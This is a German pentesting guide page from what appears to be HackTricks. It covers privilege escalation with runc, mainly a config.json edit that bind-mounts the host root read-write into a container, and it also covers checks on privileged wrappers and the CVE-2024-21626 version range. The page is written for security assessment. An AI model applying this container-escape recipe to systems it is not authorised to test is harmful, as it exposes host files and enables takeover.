# RunC Privilegienausweitung

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du mehr über **runc** erfahren möchtest, sieh dir folgende Seite an:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Wenn `runc` einem rootful Prozess auf dem Host zur Verfügung steht, kannst du ein OCI-Bundle verwenden, dessen Mount-Konfiguration das `/` des Hosts rekursiv per Bind-Mount unter `/` im Container einbindet und so das Dateisystem des Hosts in diesem Mount-Namespace offenlegt.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Der dokumentierte Workflow `runc run` wird mit Root-Rechten ausgeführt: In den eigenen Beispielen von runc steht „run as root“. Ein nicht privilegierter Benutzer benötigt eine Rootless-Konfiguration wie `runc spec --rootless`; laut runc müssen für diesen Modus User Namespaces aktiviert sein.<sup>[[1]](#references)</sup>

## Privilegierte Wrapper und Runtime-Versionen

Ein privilegierter Wrapper, der ein vom Aufrufer kontrolliertes OCI-Bundle akzeptiert, kann Host-Dateien offenlegen, wenn er unsichere Bind Mounts zulässt. Prüfe, ob der Wrapper Pfad-Traversal und Symlinks auflöst, bevor er Mount-Quellen und -Ziele validiert, und ob er `process.cwd` einschränkt. Eine sudo-Regel oder eine beschreibbare `config.json` allein belegt nicht, dass der Wrapper das Bundle akzeptiert oder es mit Host-Rechten ausführt.

Unabhängig davon betraf [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) Upstream-Versionen von `runc` von `1.0.0-rc93` bis einschließlich `1.1.11`; `1.1.12` enthält den Upstream-Fix. Durchgesickerte Dateideskriptoren und eine unzureichende Validierung des Arbeitsverzeichnisses konnten bei bestimmten `runc run`- oder `runc exec`-Workflows dazu führen, dass ein Container-Prozess außerhalb seines Root-Verzeichnisses ausgeführt wurde. Die Dateideskriptor-Nummern hängen vom Aufruf ab, und eine Versionszeichenfolge belegt keine Ausnutzbarkeit, wenn ein Anbieter Fixes zurückportiert hat oder der Aufrufer einen privilegierten Runtime-Aufruf nicht beeinflussen kann.

## References

- [1] [runc: CLI-Werkzeug zum Starten und Ausführen von Containern](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI-Runtime-Spezifikation: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Gemeinsam genutzte Teilbäume](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
